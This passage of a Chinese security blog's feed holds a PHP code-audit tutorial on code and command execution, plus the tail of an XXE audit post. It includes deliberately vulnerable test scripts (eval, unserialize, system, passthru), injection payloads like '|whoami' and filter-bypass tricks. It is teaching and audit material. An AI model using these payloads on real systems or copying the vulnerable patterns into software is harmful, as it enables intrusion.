id="0x02-防御建议"><a href="#0x02-防御建议" class="headerlink" title="0x02 防御建议"></a>0x02 防御建议</h2><p>禁用外部引用和过滤敏感关键词。</p><ul><li><p>PHP 禁用引用外部实体</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></blockquote></li><li><p>PHP过滤敏感关键词</p></li></ul><blockquote><p>在解析配置文件、网络数据时、校验并过滤掉 <code>&lt;!DOCYPE&gt;、&lt;!ENTITY&gt;、SYSTEM、PUBLIC等相关的关键词</code></p></blockquote><h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><p>XXE 与关键词密切相关，对XXE 审计方法也是直接搜索相关的关键词，如 file_get_contents、php://input、simplexml_load_string等围绕这些关键词上下文分析，看是否存在 XXE漏洞</p><h3 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1.file_get_contents"></a>1.file_get_contents</h3><p>file_get_contents — 将整个文件读入一个字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$filename</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$use_include_path</span> = <span class="literal">false</span>,</span><br><span class="line">    resource <span class="variable">$context</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = ?</span><br><span class="line">): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2.php://input"></a>2.php://input</h3><p>是个可以访问请求的原始数据的只读流。</p><p>结合 file_get_contents(“php://input”) 可以读取POST提交的数据，存入 <code>$xml</code>，</p><h3 id="3-simplexml-load-string"><a href="#3-simplexml-load-string" class="headerlink" title="3.simplexml_load_string"></a>3.simplexml_load_string</h3><p>php 中的 simplexml_load_string 函数将xml 格式字符串转换为对应的simpleXMLElementObject</p><p>具体使用方法可以参考我之前写的 <a href="https://blog.csdn.net/fengzilin1973/article/details/116355031?spm=1001.2014.3001.5501">浅谈 XXE 漏洞任意文件读取</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>xxe 审计的思路，就是结合关键的函数，以及是否开启对应的功能，进行审计，直接使用关键字搜索即可。</p><p>参考链接</p><p><a href="https://www.php.net/manual/zh/function.file-get-contents">https://www.php.net/manual/zh/function.file-get-contents</a></p><p><a href="https://blog.csdn.net/fengzilin1973/article/details/116355031?spm=1001.2014.3001.5501">https://blog.csdn.net/fengzilin1973/article/details/116355031?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
    <summary type="html">XXE的基础介绍，及审计思路</summary>
    
    
    
    <category term="代码审计" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="XXE" scheme="https://fz1lin.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计-代码执行与命令执行</title>
    <link href="https://fz1lin.com/2021/4050625683/"/>
    <id>https://fz1lin.com/2021/4050625683/</id>
    <published>2021-12-24T09:30:52.000Z</published>
    <updated>2021-12-28T09:59:59.325Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-代码执行与命令执行的区别"><a href="#0x00-代码执行与命令执行的区别" class="headerlink" title="0x00 代码执行与命令执行的区别"></a>0x00 代码执行与命令执行的区别</h2><ul><li><p>代码执行是指用户通过客户端提交可执行命令的代码，由于服务器没有对其函数的参数做有效过滤，导致系统执行了非法命令代码</p></li><li><p>命令执行是指被攻击者利用从而在系统中执行任意指令的漏洞，通过调用操作系统命令（相当于ipconfig等执行命令）</p></li></ul><h2 id="0x01-代码执行"><a href="#0x01-代码执行" class="headerlink" title="0x01 代码执行"></a>0x01 代码执行</h2><p>代码执行漏洞产生的原因，在系统设计和开发过程中，为了给用户带来各种各样的功能，以及业务的便利性，并没有注意程序代码所用的函数，实现的功能、执行的流程等方面是否安全，所以产生的原因就是，没有对整体的架构，纳入安全考虑，才导致的代码执行。</p><h3 id="1-代码执行函数"><a href="#1-代码执行函数" class="headerlink" title="1.代码执行函数"></a>1.代码执行函数</h3><p>代码执行，就是通过参数、变量等制定可以执行的代码，参数和变量中，不是数字、字符串等，而是恶意的代码，从而导致了代码执行。在PHP语言和框架中，有很多代码执行函数，如下</p><p>动态函数，这些函数的参数都是用户可控的，如果没有进行有效的过滤，就会触发代码执行</p><table><thead><tr><th>函数</th><th>含义</th></tr></thead><tbody><tr><td>eval()</td><td>把字符串作为PHP代码执行</td></tr><tr><td>assert()</td><td>检查一个断言是否为 <code>false</code></td></tr><tr><td>preg_replace()</td><td>执行一个正则表达式的搜索和替换</td></tr><tr><td>call_user_func()</td><td>把第一个参数作为回调函数调用</td></tr><tr><td>call_user_func_array()</td><td>调用回调函数，并把一个数组参数作为回调函数的参数</td></tr><tr><td>create_function()</td><td>创建匿名（lambda 风格）函数</td></tr><tr><td>array_map()</td><td>为数组的每个元素应用回调函数</td></tr></tbody></table><p>通过文件包含函数，代码执行</p><table><thead><tr><th>函数</th><th>含义</th></tr></thead><tbody><tr><td>include()</td><td>包含多次</td></tr><tr><td>include_once()</td><td>包含一次</td></tr><tr><td>require()</td><td>包含多次</td></tr><tr><td>require_once()</td><td>包含一次</td></tr><tr><td>file_get_contents()</td><td>将整个文件读入一个字符串</td></tr><tr><td>file_put_contents()</td><td>将一个字符串写入文件</td></tr><tr><td>fwrite()</td><td>写入文件（可安全用于二进制文件）</td></tr></tbody></table><h3 id="2-preg-replace"><a href="#2-preg-replace" class="headerlink" title="2.preg_replace"></a>2.preg_replace</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure><p>第一个参数是要搜索的模式，可以是字符串或一个字符串数组</p><p>第二个参数是用于替换的字符串或字符串数组</p><p>第三个参数是要搜索替换的目标字符串或字符串数组</p><p>漏洞成因</p><p>当第一个参数 patern 存在 /e 模式修饰符且 PHP 配置中的magic_quotes_gpc=Off时，函数会将其第二个参数值当做  PHP 代码进行解析执行，该函数的三个参数都是用户可控的，因此，是产生代码执行漏洞的关键。</p><p>参数利用</p><p>第一个参数</p><p>对PHP5.6及之前的框架，新建一个 test1.php 脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&quot;/&lt;php&gt;(.*?)&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;reg&#x27;</span>], <span class="string">&#x27;\\1&#x27;</span>, <span class="string">&#x27;&lt;php&gt;phpinfo()&lt;/php&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问 URL 地址触发了该代码执行漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test1.php?reg=%3C\/php%3E/e</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223184634876.png" alt="image-20211223184634876"> </p><p>第二个参数利用</p><p>新建 test2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&quot;/anyingv/e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>], <span class="string">&#x27;anyingv_test&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问 URL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test2.php?test=phpinfo()</span></span><br></pre></td></tr></table></figure><p> <img src="/2021/4050625683/image-20211223185528777.png" alt="image-20211223185528777"> </p><p>第三个参数</p><p>新建 test3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&quot;/&lt;php&gt;(.*?)&lt;\/php&gt;/e&quot;</span>, <span class="string">&#x27;\\1&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问URL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test3.php?test=&lt;php&gt;phpinfo()&lt;/php&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223190010801.png" alt="image-20211223190010801"> </p><h3 id="2-call-user-func"><a href="#2-call-user-func" class="headerlink" title="2.call_user_func"></a>2.call_user_func</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>], <span class="variable">$b</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问 URL</p><p><img src="/2021/4050625683/image-20211223190511841.png" alt="image-20211223190511841"> </p><h3 id="3-array-map"><a href="#3-array-map" class="headerlink" title="3.array_map()"></a>3.array_map()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">array</span> ...<span class="variable">$arrays</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>第一个参数是回调函数，第二个参数是要处理的数组</p><p>新建test5.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">array_map(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>], <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问 URL</p><p><img src="/2021/4050625683/image-20211223191049749.png" alt="image-20211223191049749"> </p><h3 id="4-动态函数-a-b-与-assert"><a href="#4-动态函数-a-b-与-assert" class="headerlink" title="4.动态函数 $a($b) 与 assert()"></a>4.动态函数 <code>$a($b)</code> 与 assert()</h3><p>动态函数<code>$a($b)</code> 的功能是将 <code>$a</code> 替换为 <code>$_GET[&#39;a&#39;]</code>，将<code>$b</code> 替换为 <code>$_GET[&#39;b&#39;]</code>，动态函数在不当使用时造成的代码执行漏洞。</p><p>新建 test6.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223191637056.png" alt="image-20211223191637056"> </p><p>assert() 函数判断一个表达式是否成立，返回 true 或 false，当其参数为多个字符组成的字符串时，该函数首先将字符串当做PHP代码执行，并将代码执行返回的结果作为表达式判断是否有效。</p><p>新建 test7.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">assert(phpinfo());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223191927853.png" alt="image-20211223191927853"> </p><p>直接触发嵌入的phpinfo()代码</p><h3 id="5-反序列化代码执行与eval"><a href="#5-反序列化代码执行与eval" class="headerlink" title="5.反序列化代码执行与eval()"></a>5.反序列化代码执行与eval()</h3><p>在反序列化结束时，如果未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，目录遍历，SQL注入等不可控的后果，因为语言的特征，在反序列化过程中有可能会触发对象中的魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//类的构造函数</span></span><br><span class="line">__destruct() <span class="comment">//类的析构函数</span></span><br><span class="line">__call() <span class="comment">//在对象中调用一个不可访问方法时调用</span></span><br><span class="line">__callStatic() <span class="comment">//用静态方式中调用一个不可访问方法时调用</span></span><br><span class="line">__get() <span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line">__set() <span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line">__isset() <span class="comment">//当对不可访问属性调用isset()或empty()时调用</span></span><br><span class="line">__unset() <span class="comment">//当对不可访问属性调用unset()时被调用。</span></span><br><span class="line">__sleep() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line">__wakeup() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line">__toString() <span class="comment">//类被当成字符串时的回应方法</span></span><br><span class="line">__invoke() <span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line">__set_state() <span class="comment">//调用var_export()导出类时，此静态方法会被调用。</span></span><br><span class="line">__clone() <span class="comment">//当对象复制完成时调用</span></span><br><span class="line">__autoload() <span class="comment">//尝试加载未定义的类</span></span><br><span class="line">__debugInfo() <span class="comment">//打印所需调试信息</span></span><br></pre></td></tr></table></figure><p>eval()函数把参数的字符串值当做 PHP 代码来执行，当字符串是合法的 PHP 代码且以分号作为行结尾时，代码在服务端的运行效果与通过该函数触发执行效果相同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;cdf&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$a=$b;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终结果为 cdf</p><p>触发反序列化漏洞，需要具备两个条件</p><ul><li>unserialize() 函数的参数可控</li><li>PHP 代码文件中存在可利用的类，类中有魔术方法</li></ul><p>新建 test8.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>创建payload.php</p><p>先访问 payload页面，获取payload，然后将payload输入到 test中触发了反序列化漏洞</p><p><img src="/2021/4050625683/image-20211223194733034.png" alt="image-20211223194733034"> </p><h2 id="0x02-命令执行"><a href="#0x02-命令执行" class="headerlink" title="0x02 命令执行"></a>0x02 命令执行</h2><p>命令执行漏洞，因为没有对用户传入或构造的参数进行有效的安全检测，从而执行了参数中嵌入的系统操作命令或调用了触发系统命令的函数，是的攻击者可以在目标系统中不受限制地执行系统命令，如 关机执行，查询IP，删除，移动，等常见的dos或者Linux命令。</p><h3 id="1-命令执行函数"><a href="#1-命令执行函数" class="headerlink" title="1.命令执行函数"></a>1.命令执行函数</h3><p> 详情可参考 <a href="https://www.php.net/manual/zh/">https://www.php.net/manual/zh/</a></p><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>exec()</td><td>执行一个外部程序</td></tr><tr><td>system()</td><td>执行外部程序，并且显示输出</td></tr><tr><td>shell_exec()</td><td>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</td></tr><tr><td>passthru()</td><td>执行外部程序并且显示原始输出</td></tr><tr><td>popen()</td><td>打开进程文件指针</td></tr><tr><td>proc_open()</td><td>执行一个命令，并且打开用来输入/输出的文件指针</td></tr><tr><td>pcntl_exec()</td><td>在当前进程空间执行指定程序</td></tr></tbody></table><h3 id="2-管道符"><a href="#2-管道符" class="headerlink" title="2.管道符"></a>2.管道符</h3><p>命令执行漏洞需要利用操作系统提供的管道符功能，管道符的意思就是，将前一个命令的输出，作为后一个命令的输入。</p><p>windows 和 Linux 环境下的符号相同，含义不相同</p><table><thead><tr><th>命令</th><th>windows</th><th>Linux</th></tr></thead><tbody><tr><td><code>,</code></td><td>无</td><td>执行完前面的命令再执行后面的命令</td></tr><tr><td><code>&amp;</code></td><td>前面的命令为假则直接执行后面的命令<br>为真，则在前面的命令执行后再执行后面的命令</td><td>前面的命令为假则直接执行后面的命令<br>为真，则在前面的命令执行后再执行后面的命令</td></tr><tr><td><code>&amp;&amp;</code></td><td>前面的命令为假则直接出错，后面的命令也不执行；<br>反之，前面的命令执行成功后才执行后面的命令</td><td>前面的命令为假则直接出错，后面的命令也不执行；<br>反之，前面的命令执行成功后才执行后面的命令</td></tr><tr><td>`</td><td>`</td><td>前面的命令不执行，直接执行后面的命令</td></tr><tr><td>`</td><td></td><td>`</td></tr></tbody></table><h3 id="3-命令注入绕过"><a href="#3-命令注入绕过" class="headerlink" title="3.命令注入绕过"></a>3.命令注入绕过</h3><p>我们在代码审计的时候，要构造payload的，有些情况下，需要绕过一些过滤，具体绕过的方法可以参考这篇文章 <a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a>，这里我就列举一些简单的绕过方式。</p><p>Linux-空格绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span></span><br><span class="line">$IFS$<span class="number">1</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">&lt; 比如cat&lt;a.tct:表示cat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; <span class="comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br></pre></td></tr></table></figure><p>Linux-常用字符绕过</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">; 多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">&amp;&amp; 只有在 &amp;&amp; 左边的命令返回真(命令返回值 $? == 0),&amp;&amp;右边的命令才会被执行。</span><br><span class="line">|| 只有在 || 左边的命令返回假(命令返回值 $? == 1),||右边的命令才会被执行。</span><br><span class="line">%0a</span><br><span class="line">%0d</span><br><span class="line">| (管道符)</span><br></pre></td></tr></table></figure><p>windows-set命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> a=1 </span><br><span class="line"><span class="built_in">echo</span> a</span><br><span class="line"><span class="built_in">echo</span> %a%</span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223203054319.png" alt="image-20211223203054319"> </p><p>set 绕过利用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> a=who</span><br><span class="line"><span class="built_in">set</span> b=ami</span><br><span class="line">%a%%b% //正常执行whoami</span><br><span class="line">call %a%%b% //正常执行whoami</span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211223203028002.png" alt="image-20211223203028002"> </p><p>windows-逻辑运算符</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami | ping www.baidu.com</span><br><span class="line">whoami || ping www.baidu.com</span><br><span class="line">qwe &amp; ping www.baidu.com</span><br><span class="line">qwe &amp;&amp; ping www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="4-system"><a href="#4-system" class="headerlink" title="4.system()"></a>4.system()</h3><p>system()，函数执行参数指定的系统命令，并且输出执行结果</p><p>新建test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&#x27;ping 127.0.0.1&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?test=|whoami</span></span><br></pre></td></tr></table></figure><p> <img src="/2021/4050625683/image-20211224145438768.png" alt="image-20211224145438768"> </p><h3 id="5"><a href="#5" class="headerlink" title="5. ``` `"></a>5. ``` `</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;&lt;pre&gt;&#x27;; #格式化语句</span><br><span class="line">echo `ping 127.0.0.1 &#123;$_REQUEST[&#x27;test&#x27;]&#125;`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211224153922432.png" alt="image-20211224153922432"> </p><p>6.<code>exec()</code></p><p>exec() 函数有两个参数，默认情况下，会返回第一个参数指定的命令运行结果的最后一行，第二个参数有效时，会将返回结果追加到第二个从参数的值后面</p><p>新建test2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>; <span class="comment">#格式化语句</span></span><br><span class="line">exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">print_r(<span class="variable">$output</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211224155751521.png" alt="image-20211224155751521"> </p><blockquote><p> %26是&amp;的urlencode 编码</p></blockquote><h3 id="6-shell-exec"><a href="#6-shell-exec" class="headerlink" title="6.shell_exec()"></a>6.shell_exec()</h3><p>shell_exec() 函数通过shell执行参数指定的命令，输出命令返回结果的完整字符串。</p><p>在 Linux 下新建 test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(shell_exec(<span class="string">&quot;ls&quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211224161426089.png" alt="image-20211224161426089"> </p><h3 id="7-passthru"><a href="#7-passthru" class="headerlink" title="7.passthru()"></a>7.passthru()</h3><p>passthru()函数调用参数指定的命令，把命令运行的结果原样地输出到标准输出设备上</p><p>windows下新建 test3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">passthru(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211224172026715.png" alt="image-20211224172026715"> </p><h2 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h2><ol><li>严格过滤用户输入的数据，禁止执行非预期系统命令。</li><li>减少或不使用代码或命令执行函数</li><li>客户端提交的变量在放入函数前进行检测</li><li>减少或不使用危险函数</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在审计代码执行和命令执行时，主要的漏洞点，还是函数本身，我们可以通过搜索的方式来搜索函数，分析代码，看其是否过滤，然后通过函数的特征，进行构造payload 绕过，是否能命令执行/代码执行。</p><p>参考</p><p><a href="https://www.php.net/manual/zh/index.php">https://www.php.net/manual/zh/index.php</a></p><p><a href="https://www.anquanke.com/post/id/229611#h3-1">https://www.anquanke.com/post/id/229611#h3-1</a></p><p><a href="https://www.cnblogs.com/iAmSoScArEd/p/10651947.html#auto_id_5">https://www.cnblogs.com/iAmSoScArEd/p/10651947.html#auto_id_5</a></p>]]></content>
    
    
    <summary type="html">代码执行和命令执行的概述，代码审计中所使用到的函数，以及函数的构造payload的方法。</summary>
    
    
    
    <category term="代码审计" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="RCE" scheme="https://fz1lin.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 写作清单</title>
    <link href="https://fz1lin.com/2021/2056430684/"/>
